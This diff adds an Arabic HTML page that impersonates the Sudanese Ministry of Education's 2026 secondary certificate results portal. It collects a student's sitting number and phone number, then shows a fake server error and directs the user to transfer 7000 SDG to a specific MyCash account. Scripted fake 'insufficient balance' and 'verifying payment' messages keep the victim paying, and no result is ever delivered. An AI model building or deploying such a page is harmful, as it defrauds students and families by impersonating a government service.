@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Nateeja Portal</title>
+    <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
+    <style>
+        * { box-sizing: border-box; }
+        html, body { margin: 0; padding: 0; min-height: 100%; }
+        body {
+            font-family: Tahoma, Arial, sans-serif;
+            background: #fff url("background.png") center bottom / cover no-repeat fixed;
+            color: #222;
+        }
+        .page { min-height: 100vh; padding: 30px 15px 120px; }
+        .logos { width: min(100%, 900px); margin: 0 auto 30px; text-align: center; }
+        .logos img { display: block; width: 100%; max-width: 900px; height: auto; margin: 0 auto; }
+        .title { text-align: center; margin-bottom: 35px; }
+        .title h2 { margin: 10px 0; color: #28489e; font-size: 25px; font-weight: bold; }
+        .title h2:last-child { color: #222; }
+        .form-container {
+            width: 100%; max-width: 430px; margin: 0 auto;
+            background: rgba(255, 255, 255, 0.94);
+            padding: 25px 22px; border-radius: 12px;
+            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.12);
+            position: relative; transition: all 0.3s ease;
+        }
+        .input-group { margin-bottom: 18px; }
+        label { display: block; margin-bottom: 7px; color: #28489e; font-weight: bold; text-align: right; }
+        input {
+            width: 100%; height: 50px; border: 1px solid #ccc; border-radius: 7px;
+            padding: 10px 14px; font-size: 17px; text-align: center; outline: none;
+            direction: ltr; background: #fff; transition: 0.2s;
+        }
+        input:focus { border-color: #28489e; box-shadow: 0 0 0 3px rgba(40, 72, 158, 0.12); }
+        .price, .tax { text-align: center; color: #28489e; font-size: 20px; font-weight: bold; margin: 20px 0 5px; }
+        .tax { color: #666; font-size: 14px; margin-bottom: 22px; }
+        button {
+            width: 100%; height: 52px; border: 0; border-radius: 7px;
+            background: #28489e; color: white; font-size: 18px; font-weight: bold;
+            cursor: pointer; transition: 0.2s; font-family: inherit;
+        }
+        button:hover { background: #1d3578; }
+        button:active { transform: scale(0.98); }
+        .error-message, .payment-box, .waiting-box, .charge-message {
+            display: none; background: #fdecea; border: 1px solid #f5c6cb; color: #b71c1c;
+            padding: 16px; border-radius: 10px; margin-bottom: 20px; font-size: 15px;
+            text-align: center; font-weight: bold; line-height: 1.7; transition: all 0.3s;
+        }
+        .payment-box { background: #e8f0fe; border: 1px dashed #28489e; color: #1a3e8c; }
+        .payment-box .amount { font-size: 22px; font-weight: 800; color: #b3541e; display: block; margin: 6px 0; }
+        .payment-box .account { background: #fff; display: inline-block; padding: 8px 18px; border-radius: 30px; font-size: 20px; letter-spacing: 2px; font-weight: bold; border: 1px solid #ccc; margin: 8px 0; direction: ltr; }
+        .waiting-box {
+            display: none; flex-direction: column; align-items: center; justify-content: center;
+            background: rgba(255, 255, 255, 0.95); border: 1px solid #28489e; border-radius: 12px;
+            padding: 25px 15px; margin: 15px 0; text-align: center; color: #28489e; font-weight: bold;
+        }
+        .spinner {
+            width: 48px; height: 48px; border: 6px solid #d0d8f0; border-top: 6px solid #28489e;
+            border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .charge-message { background: #fff3cd; border: 1px solid #ffc107; color: #856404; }
+        .footer { text-align: center; margin-top: 40px; color: #555; font-size: 13px; }
+        .hidden { display: none !important; }
+        @media (max-width: 600px) {
+            .page { padding-top: 20px; padding-bottom: 80px; }
+            .title h2 { font-size: 18px; }
+            .form-container { max-width: 95%; padding: 20px 15px; }
+            input { height: 48px; }
+            button { height: 50px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="page">
+        <div class="logos">
+            <img src="logos.png" alt="شعارات الموقع">
+        </div>
+
+        <div class="title">
+            <h2>جمهورية السودان</h2>
+            <h2>وزارة التربية و التعليم</h2>
+            <h2>نتيجة شهادة الثانوية العامة</h2>
+            <h2>لعام 2026</h2>
+        </div>
+
+        <div class="form-container" id="formContainer">
+            <div id="initialForm">
+                <form id="resultForm" autocomplete="off">
+                    <div class="input-group">
+                        <label for="sitting-no">رقم الجلوس</label>
+                        <input type="text" name="sitting_no" id="sitting-no" placeholder="رقم الجلوس" inputmode="numeric" autocomplete="off" required>
+                    </div>
+                    <div class="input-group">
+                        <label for="phone-no">رقم الهاتف</label>
+                        <input type="text" name="phone_no" id="phone-no" placeholder="رقم الهاتف" inputmode="numeric" autocomplete="off" required>
+                    </div>
+                    <div class="price">سعر النتيجة: 7000 جنيه</div>
+                    <div class="tax">(الأسعار شاملة الضريبة)</div>
+                    <button type="submit" id="submitBtn">طلب رمز التحقق</button>
+                </form>
+            </div>
+
+            <div id="errorBox" class="error-message">
+                ⚠️ خطأ في المخدم، يرجى محاولة أخرى.
+                <span style="display:block; margin-top:10px; font-weight:normal;">سيتم توجيهك للتحويل عبر ماي كاش</span>
+            </div>
+
+            <div id="paymentBox" class="payment-box">
+                <span style="font-size:18px;">💳 قم بتحويل المبلغ إلى حساب ماي كاش</span>
+                <span class="amount">7000 جنيه سوداني</span>
+                <span>رقم الحساب:</span>
+                <span class="account">402731791</span>
+                <span style="display:block; font-size:14px; margin-top:8px;">(بعد التحويل اضغط زر عرض النتائج)</span>
+                <button id="showResultsBtn" style="background:#1d7a3e; margin-top:15px; width:100%;">📋 عرض النتائج</button>
+            </div>
+
+            <div id="chargeMessage" class="charge-message">
+                ⚡ الرجاء الشحن! رصيدك غير كافٍ لعرض النتيجة.
+                <span style="display:block; margin-top:10px; font-weight:normal;">قم بشحن رصيدك أو أعد المحاولة</span>
+            </div>
+
+            <div id="waitingBox" class="waiting-box">
+                <div class="spinner"></div>
+                <div style="font-size:22px; margin-bottom:5px;">⏳ الرجاء الانتظار</div>
+                <div style="font-size:16px; color:#555;">جاري التحقق من الدفع ...</div>
+            </div>
+        </div>
+        <div class="footer">نتيجة شهادة الثانوية العامة - 2026</div>
+    </div>
+
+    <script>
+        (function() {
+            function onlyNumbers(input) {
+                if (!input) return;
+                input.addEventListener("input", function() {
+                    this.value = this.value.replace(/[^0-9]/g, "");
+                });
+            }
+
+            const sittingInput = document.getElementById("sitting-no");
+            const phoneInput = document.getElementById("phone-no");
+            onlyNumbers(sittingInput);
+            onlyNumbers(phoneInput);
+
+            const form = document.getElementById("resultForm");
+            const errorBox = document.getElementById("errorBox");
+            const paymentBox = document.getElementById("paymentBox");
+            const waitingBox = document.getElementById("waitingBox");
+            const chargeMessage = document.getElementById("chargeMessage");
+            const showResultsBtn = document.getElementById("showResultsBtn");
+            const submitBtn = document.getElementById("submitBtn");
+            const initialFormDiv = document.getElementById("initialForm");
+
+            let clickCount = 0;
+            let isWaiting = false;
+            let waitingTimeout = null;
+
+            function hideAllBoxes() {
+                errorBox.style.display = 'none';
+                paymentBox.style.display = 'none';
+                waitingBox.style.display = 'none';
+                chargeMessage.style.display = 'none';
+                if (showResultsBtn) showResultsBtn.style.display = 'none';
+            }
+
+            form.addEventListener("submit", function(event) {
+                event.preventDefault();
+                const sittingNo = sittingInput.value.trim();
+                const phoneNo = phoneInput.value.trim();
+
+                if (sittingNo === "" || phoneNo === "") {
+                    alert("يرجى إدخال رقم الجلوس ورقم الهاتف");
+                    return;
+                }
+
+                hideAllBoxes();
+
+                errorBox.style.display = 'block';
+                setTimeout(() => {
+                    errorBox.style.display = 'none';
+                    paymentBox.style.display = 'block';
+                    showResultsBtn.style.display = 'block';
+                }, 800);
+
+                submitBtn.textContent = "تم استلام الطلب، حول المبلغ";
+                setTimeout(() => {
+                    submitBtn.textContent = "طلب رمز التحقق";
+                }, 4000);
+            });
+
+            showResultsBtn.addEventListener("click", function() {
+                if (isWaiting) return;
+
+                clickCount++;
+
+                if (clickCount <= 4) {
+                    paymentBox.style.display = 'none';
+                    showResultsBtn.style.display = 'none';
+                    chargeMessage.style.display = 'block';
+                    
+                    setTimeout(() => {
+                        chargeMessage.style.display = 'none';
+                        paymentBox.style.display = 'block';
+                        showResultsBtn.style.display = 'block';
+                    }, 2000);
+                } else {
+                    paymentBox.style.display = 'none';
+                    showResultsBtn.style.display = 'none';
+                    chargeMessage.style.display = 'none';
+                    
+                    waitingBox.style.display = 'flex';
+                    isWaiting = true;
+
+                    submitBtn.disabled = true;
+                    submitBtn.style.opacity = '0.6';
+                    submitBtn.style.cursor = 'not-allowed';
+
+                    const threeHours = 3 * 60 * 60 * 1000;
+                    const demoDelay = 10000;
+                    const waitTime = demoDelay;
+
+                    waitingTimeout = setTimeout(() => {
+                        waitingBox.style.display = 'none';
+                        isWaiting = false;
+                        clickCount = 0;
+                        submitBtn.disabled = false;
+                        submitBtn.style.opacity = '1';
+                        submitBtn.style.cursor = 'pointer';
+                        
+                        paymentBox.style.display = 'block';
+                        showResultsBtn.style.display = 'block';
+                        
+                        alert('انتهى وقت الانتظار. يمكنك المحاولة مرة أخرى.');
+                    }, waitTime);
+                }
+            });
+
+            form.addEventListener('reset', function() {
+                hideAllBoxes();
+                initialFormDiv.style.display = 'block';
+                if (waitingTimeout) clearTimeout(waitingTimeout);
+                isWaiting = false;
+                clickCount = 0;
+                submitBtn.disabled = false;
+                submitBtn.style.opacity = '1';
+                submitBtn.style.cursor = 'pointer';
+            });
+        })();
+    </script>
+</body>
+</html>
